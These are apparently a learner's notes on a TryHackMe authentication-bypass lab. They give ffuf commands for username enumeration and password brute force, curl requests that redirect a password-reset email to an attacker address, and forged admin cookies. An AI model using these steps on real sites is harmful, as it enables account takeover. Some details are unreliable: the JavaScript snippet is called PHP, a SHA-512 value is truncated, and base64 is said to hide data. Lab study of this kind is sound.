---
title: Cyber101 Session 3 - Authentication Bypass
tags:
  - infosec
  - fundamentals
---

>[!info]
>Website authentication methods can be bypassed, defeated or broken. These vulnerabilities can be some of the most critical as it often ends in leaks of customers personal data. Let's do some research on this session 🚄🚄🚄

# Username Enumeration

- A helpful exercise to complete when trying to find authentication vulnerabilities is creating a list of valid usernames.
- Website error messages are great resources for collating this information to build our list of valid usernames.
- U should think this method like brute force to authentication bypass and yeah it cool stuff we find the alert the form return to user if they pass the username and password and username is really exist or not exist, **it is the first thing web dev need to take care about to coding this stuff** because the hacker can use this alert to confirm the valid username really exists on your website and more specific is really existing in the database. So we use ffuf tool (Virtual Host) to do this stuff and we do this with the username wordlists. Let's go 😄
```shell
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.206.157/customers/signup -mr "username already exists"
```

Let analyses this 🥶 command: 

- **-w** : argument selects the file's location on the computer that contains the list of usernames that we're going to check exists.
- **-X** : argument specifies the request method, this will be a GET request by default, but it is a POST request in our example.
- **-d** : argument specifies the data that we are going to send. In our example, we have the fields username, email, password and cpassword. We've set the value of the username to **FUZZ**. In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request.
- **-H**: argument is used for adding additional headers to the request. Setting Content-Type header to talk webserver knows we are sending form data. 
- **-u**: argument specifies the URL we are making the request to
- **-mr**: argument is the text on the page we are looking for validate 

 > [!quote]
 > **JUST** do this stuff and you can solve problem in tryhackme and yeah i will do this in real-web on hacking write-up 🚀🚀🚀
# Brute Force

- Refer to previous task we find some useful username and yeah let next step to brute force to access login form 
- A brute force attack is an automated process that tries a list of commonly used passwords against either a single username or, like in our case, a list of usernames.

```shell
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.206.157/customers/login -fc 200
```

Let analyses this 🥶 command: 
- Previously we used the **FUZZ** keyword to select where in the request the data from the wordlists would be inserted, but because we're using multiple wordlists, we have to specify our own FUZZ keyword.
- In this session, We use **W1** for our list of valid usernames and **W2** for the list of passwords we will try
- **-w** : argument but separated with a comma.
- **-fc** :  argument to check for an HTTP status code other than 200.

Yeah look the result 🚀🚀🚀
![[Pasted image 20240219140233 1.png]]

# Logic FLaw
What is a Logic Flaw?: A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker. Logic flaws can exist in any area of a website. Look the pictures and we will discuss this under this picture
<div align="center">
	 <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/58e63d7810ac4b23051e1dd4a24ef792.png">
</div>

## Logic Flaw Example
- The below mock code example checks to see whether the start of the path the client is visiting begins with /admin and if so, then further checks are made to see whether the client is, in fact, an admin. If the page doesn't begin with /admin, the page is shown to the client.
```javascript
if( url.substr(0,6) === '/admin') {
	# Code to check user is an admin
} else {
	# View Page
}
```

Because the above PHP code example uses three equals signs `===`, it's looking for an exact match on the string, including the same letter casing. The code presents a logic flaw because an unauthenticated user requesting /adMin will not have their privileges checked and have the page displayed to them, totally bypassing the authentication checks.

## Practical (Do this on tryhackme, it just copy step and expland how and why do that) 
- It like some kind u give the email address and u will get something like a box or alert return if u send the fake email like **"Account not found from supplied email address"**, badly messages LOL. So will look to good email to do this stuff
- For demonstration purposes, we'll use the email address robert@acmeitsupport.thm which is accepted. We're then presented with the next stage of the form, which asks for the username associated with this login email address.If we enter robert as the username and press the Check Username button, you'll be presented with a confirmation message that a password reset email will be sent to robert@acmeitsupport.thm. (Basic Checking in web, Sure :smiley:)
- At this stage, you may be wondering what the vulnerability could be in this application as you have to know both the email and username and then the password link is sent to the email address of the account owner. So this require both of the request so we need tool Curl to send the request to web

```shell
curl 'http://10.10.206.157/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
```

In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable **REQUEST**, which contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.

```shell
curl 'http://10.10.206.157/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```

For the next step, you'll need to create an account on the Acme IT support customer section, doing so gives you a unique email address that can be used to create support tickets. The email address is in the format of `{username}@customer.acmeitsupport.thm`

Now rerunning Curl Request 2 but with your @acmeitsupport.thm in the email field you'll have a ticket created on your account which contains a link to log you in as Robert. Using Robert's account, you can view their support tickets and reveal a flag.
```shell
curl 'http://10.10.206.157/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
```

So i must see some stuff on youtube and i see it very cool PWN to website by sending the reset ticket to my account so cool stuff, it will attract not only me but also u, very strange and interesting stuff and i will do this stuff on LAB in hacking repo with realweb<br>
![[Pasted image 20240219140726 1.png]]

![[Pasted image 20240219140738 1.png]]

# Cookie Tampering
Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges.

## Plaintext
The contents of some cookies can be in plain text, and it is obvious what they do. Take, for example, if these were the cookie set after a successful login:

```bash
Set-Cookie: logged_in=true; Max-Age=3600; Path=/
Set-Cookie: admin=false; Max-Age=3600; Path=/
```

We see one cookie (logged_in), which appears to control whether the user is currently logged in or not, and another (admin), which controls whether the visitor has admin privileges. Using this logic, if we were to change the contents of the cookies and make a request we'll be able to change our privileges.

*Do this stuff like access the cookies by Curl to directly with web request and received the flag or something needing. Do this stuff by step*
```shell
# We can see we are returned a message of: Not Logged In
curl http://10.10.206.157/cookie-test 
# We can see : Logged In As A User
curl -H "Cookie: logged_in=true; admin=false" http://10.10.206.157/cookie-test
# We can see : Logged In As An Admin
curl -H "Cookie: logged_in=true; admin=true" http://10.10.206.157/cookie-test 
```
## Hashing
Sometimes cookie values can look like a long string of random characters; these are called hashes which are an irreversible representation of the original text. Here are some examples that you may come across:

|   Original String	|   Hash Method	|   Output	|
|---	|---	|---	|
|   1  	|  md5 	|   c4ca4238a0b923820dcc509a6f75849b	|
|   1	|   sha-256	|   6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b	|
|   1	|   sha-512	|   4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a	|
|   1	|   sha1	|   356a192b7913b04c54574d18c28d46e6395428ab	|

You can do this stuff by anything encrypt and decrypt about the hash like this [web](https://crackstation.net/)
## Encoding
- Encoding is similar to hashing in that it creates what would seem to be a random string of text, but in fact, the encoding is reversible. So it begs the question, what is the point in encoding? Encoding allows us to convert binary data into human-readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.

- Common encoding types are base32 which converts binary data to the characters A-Z and 2-7, and base64 which converts using the characters a-z, A-Z, 0-9,+, / and the equals sign for padding.

- Example:

```http
Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/
```

With this stuff on base64 we get the string {"id":1,"admin":false}, cool stuff we can hide sensitive information about cookie, it will do kind stuff with any like with API key or with Text or something kind parameter u pass to the URL, many kind of this

>[!quote]
>So do great with this techniques which can control the website for your exploit target, Stay safe and happy hacking ! ☕ ☕ ☕ 









